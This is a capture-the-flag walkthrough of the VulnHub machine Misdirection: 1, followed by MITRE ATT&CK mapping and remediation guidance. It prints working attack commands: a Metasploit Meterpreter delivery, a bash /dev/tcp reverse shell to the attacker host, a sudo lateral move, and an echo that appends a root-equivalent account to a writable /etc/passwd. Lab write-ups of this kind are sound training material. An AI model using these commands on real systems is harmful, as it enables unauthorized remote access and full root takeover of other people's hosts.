# Misdirection: 1 — The Real Door Was Never Port 80

Look at this one! The machine literally tells you its theme in the name: everything obvious is fake, and the real attack surface is hiding in plain sight. Misdirection: 1 chains a PHP debug shell on a non-standard port with a lateral move via sudo, then exploits a world-writable /etc/passwd to plant a root account. The "misdirection" is real: port 80 runs a harmless Rocket httpd while the actual entry lives on port 8080. Classic bait-and-switch. Legit fun design.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Misdirection: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/misdirection-1,371/ |
| **Techniques** | Multi-port enumeration, PHP debug virtual shell exploitation, Metasploit web_delivery, sudo lateral movement, writable /etc/passwd injection |
| **CVEs** | CWE-94 (Improper Control of Code Generation — debug shell RCE), CWE-732 (Incorrect Permission Assignment — /etc/passwd world-writable), CWE-269 (Improper Privilege Management — sudo NOPASSWD lateral move) |
| **APT Groups** | APT41: leverages exposed debug/admin consoles (Werkzeug, phpMyAdmin, Jupyter) as initial access in cloud-facing environments; Lazarus Group: uses misconfigured sudo rules extensively in post-exploitation lateral movement phases |

---

## Attack Summary

```
netdiscover → nmap -A → ports 22, 80, 3306, 8080
  → port 80: Rocket httpd (misdirection/rabbit hole)
  → port 8080: Apache → dirb → /debug PHP virtual shell
  → Metasploit web_delivery PHP payload
  → paste one-liner into /debug → Meterpreter www-data
  → shell → python pty spawn
  → sudo -l → (root) NOPASSWD: /bin/bash as brexit
  → sudo -u brexit /bin/bash → uid=1000(brexit)
  → ls -la /etc/passwd → -rw-rw-r-- (brexit owns group write)
  → openssl passwd → hash
  → echo 'raj:HASH:0:0::/root:/bin/bash' >> /etc/passwd
  → su raj → uid=0(root)
  → /root/root.txt
```

---

## Methodology

1. Network discovery and full port scan
2. Identify the misdirection: port 80 is a decoy, port 8080 is the real target
3. Directory brute-force on port 8080 to find /debug virtual shell
4. Deliver Meterpreter reverse shell via Metasploit web_delivery
5. Lateral movement via sudo NOPASSWD: run /bin/bash as brexit
6. Discover world-writable /etc/passwd (group-owned by brexit)
7. Inject root-equivalent user into /etc/passwd
8. Switch to injected user, read root flag

---

## Step 1 — Network Discovery and Full Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Target: 192.168.1.106

nmap -sV -sC -A 192.168.1.106
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Rocket httpd
3306/tcp open  mysql   MySQL 5.x
8080/tcp open  http    Apache httpd 2.4.x
```

Four services. Port 80 is the bait: the Rocket httpd on port 80 serves a generic web page with no useful content. Port 8080 is the real Apache installation and the actual attack surface.

**Real-world note:** Port 80 decoys are uncommon but not unheard of in red team engagements. The lesson: don't stop after finding one HTTP service. Enumerate all ports, then enumerate all HTTP services.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1571 — Non-Standard Port

---

## Step 2 — Directory Brute-Force on Port 8080

```bash
dirb http://192.168.1.106:8080/
# Alternative: gobuster dir -u http://192.168.1.106:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30
```

Discovered paths:
- `/debug` — PHP virtual interactive shell (the jackpot)
- `/wordpress` — WordPress installation (rabbit hole / credential hunting)
- `/shell` — another shell endpoint

The `/debug` path exposes an interactive PHP shell running directly in the browser. It accepts PHP code and returns the output. No authentication required. This is a development debug artifact left in production.

**Real-world note:** Debug consoles (Werkzeug, PHP shells, Jupyter notebooks, Spring Boot Actuator endpoints) left accessible in production are a critical vulnerability class. APT41 specifically hunts for exposed Werkzeug and Jupyter debug consoles using Shodan and censys before initial exploitation.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1190 — Exploit Public-Facing Application

---

## Step 3 — Reverse Shell via Metasploit web_delivery

Set up the Metasploit multi-handler and web_delivery module to generate and serve a PHP reverse shell payload:

```bash
msfconsole

use exploit/multi/script/web_delivery
set TARGET 1          # PHP target
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.105
set LPORT 4444
exploit
```

Metasploit outputs a PHP one-liner to execute. Copy that one-liner and paste it into the `/debug` browser shell. A Meterpreter session opens as `www-data`.

**Alternative (manual netcat reverse shell without Metasploit):**

```php
# In the /debug shell:
system('bash -c "bash -i >& /dev/tcp/192.168.1.105/4444 0>&1"');
```

```bash
# Listener on attacker:
nc -lvnp 4444
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 4 — Shell Stabilization and Lateral Move via sudo

Drop into a native shell and stabilize:

```bash
# From Meterpreter:
sessions -i 1
shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Check sudo rights:
sudo -l
```

Output:
```
User www-data may run the following commands:
  (brexit) NOPASSWD: /bin/bash
```

This sudo rule allows `www-data` to run `/bin/bash` as the `brexit` user without a password. This is a lateral move, not a direct root escalation.

```bash
sudo -u brexit /bin/bash
id
# uid=1000(brexit) gid=1000(brexit) groups=1000(brexit)
```

Now operating as `brexit`. This user has group write access to /etc/passwd.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1078 — Valid Accounts

---

## Step 5 — Writable /etc/passwd: Root User Injection

Check /etc/passwd permissions:

```bash
ls -la /etc/passwd
# -rw-rw-r-- 1 root brexit 1679 ... /etc/passwd
```

The file is group-owned by `brexit` with group write permissions. As `brexit`, we can modify /etc/passwd directly.

Generate a password hash:

```bash
openssl passwd -1 -salt user3 pass123
# $1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

Append a root-equivalent user to /etc/passwd:

```bash
echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd
tail -3 /etc/passwd
```

**MITRE ATT&CK:** T1136.001 — Create Account: Local Account

---

## Step 6 — Root

```bash
su raj
# Password: pass123

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat root.txt
```

gg, root achieved. (❍ᴥ❍ʋ)

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Debug shell | /debug on port 8080 | dirb enumeration | PHP RCE → Meterpreter |
| Sudo rule | www-data → brexit NOPASSWD /bin/bash | sudo -l | Lateral move to brexit |
| Injected credential | raj:pass123 | /etc/passwd (appended) | su to root |
| Root flag | (contents of /root/root.txt) | /root/root.txt | Final objective |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Debug/shell endpoints accessible in production | PHP virtual shells, Werkzeug consoles, and Jupyter notebooks deployed to production are directly exploitable with no auth | Remove all debug tooling before deployment; use feature flags or environment guards to prevent debug mode in production |
| 2 | sudo NOPASSWD lateral move grants access to higher-privilege user | sudo rules that move between users (not just to root) can chain to root access indirectly | Audit all sudo rules: any NOPASSWD grant for a shell binary is a privilege escalation path |
| 3 | /etc/passwd group-writable to non-root user | Any process running as that group can inject UID-0 accounts; this is equivalent to root access | /etc/passwd must be owned root:root with permissions 644; verify with `stat /etc/passwd` |
| 4 | Multi-port HTTP services: one is decoy, one is real | Attackers enumerate all ports; defenders must secure all HTTP endpoints, not just port 80/443 | Harden all HTTP services; treat every exposed service as a potential attack surface |
| 5 | Attack chain from debug shell to root in 4 steps | This entire compromise happens in under 5 minutes with common tools; no CVEs required, just misconfigurations | Defense-in-depth: remove debug endpoints, restrict sudo, and protect /etc/passwd |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application (debug shell) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo (lateral move) | T1548.003 |
| Privilege Escalation | Privilege Escalation | Create Account: Local Account (/etc/passwd inject) | T1136.001 |
| Defense Evasion | Defense Evasion | Non-Standard Port (port 8080 for real target) | T1571 |
| Lateral Movement | Lateral Movement | Valid Accounts (sudo -u brexit) | T1078 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove all debug endpoints from production**: `/debug`, `/shell`, and similar paths must not exist on production servers; use environment-specific configuration to gate debug tooling
2. **Audit sudo rules**: `grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/`; remove any rule granting shell-escape-capable commands with NOPASSWD
3. **Fix /etc/passwd permissions**: `chmod 644 /etc/passwd; chown root:root /etc/passwd`; monitor /etc/passwd for unauthorized modifications
4. **Secure port 8080**: if Apache on port 8080 is required, apply the same hardening as port 80; remove development artifacts
5. **Implement file integrity monitoring**: alert on modifications to /etc/passwd, /etc/shadow, and /etc/sudoers

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening: disable debug mode in production; enforce production environment flags
- **D3-OAM** — Operating System Administrative Management: audit sudo rules; fix /etc/passwd permissions
- **D3-FIM** — File Integrity Monitoring: alert on /etc/passwd modifications in real time

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all HTTP services on all ports; catalog sudo rules on all hosts |
| Protect | Access Control | Remove debug endpoints; fix /etc/passwd permissions; restrict sudo |
| Protect | Identity Management | Require passwords for all sudo escalations; no NOPASSWD for shell binaries |
| Detect | Anomalies and Events | Alert on /etc/passwd modification; alert on debug console access |
| Respond | Response Planning | Remove injected accounts; rotate credentials; disable debug endpoints |
| Recover | Recovery Planning | Rebuild affected host; audit all accounts and sudo rules |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| CM-7 | Least Functionality | Remove debug endpoints from production deployments |
| AC-6 | Least Privilege | Restrict sudo rules; no NOPASSWD for shell binaries |
| AC-3 | Access Enforcement | Set /etc/passwd to 644 root:root; prevent unauthorized writes |
| SI-7 | Software, Firmware, and Information Integrity | Monitor /etc/passwd with file integrity monitoring |
| IA-2(1) | Multi-Factor Authentication | Require MFA for all admin access to web applications |
| CM-6 | Configuration Settings | Enforce production configuration standards that disable debug mode |

### CISA KEV

Exposed debug consoles (Werkzeug, phpinfo, Spring Boot Actuator) appear in multiple CISA Known Exploited Vulnerabilities entries and advisories. CISA AA22-074A specifically notes that threat actors scan for exposed debug interfaces as an initial access technique. Organizations should prioritize removing debug endpoints from internet-facing systems.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts (sudo audit, /etc/passwd permissions) | MIL3 |
| Situational Awareness (SITUATION) | Monitor for Events (FIM on /etc/passwd) | MIL2 |

---

## Final Thoughts

Misdirection: 1 delivers exactly what the name promises. The port 80 decoy is a small but effective design choice: it forces the attacker to think about what they're looking at and not just charge straight at the first HTTP service they find.

The /etc/passwd misconfiguration is a classic that appears in real environments far more often than it should. Pair it with a sudo lateral move and a debug shell, and you have a three-step root compromise with zero CVEs required.

This box is a great lesson in the difference between exploitation and misconfiguration abuse. No buffer overflows, no ROP chains: just bad defaults and weak permissions. The most dangerous vulnerabilities are often the ones that ship with the box.

Thanks guys!! (❍ᴥ❍ʋ)
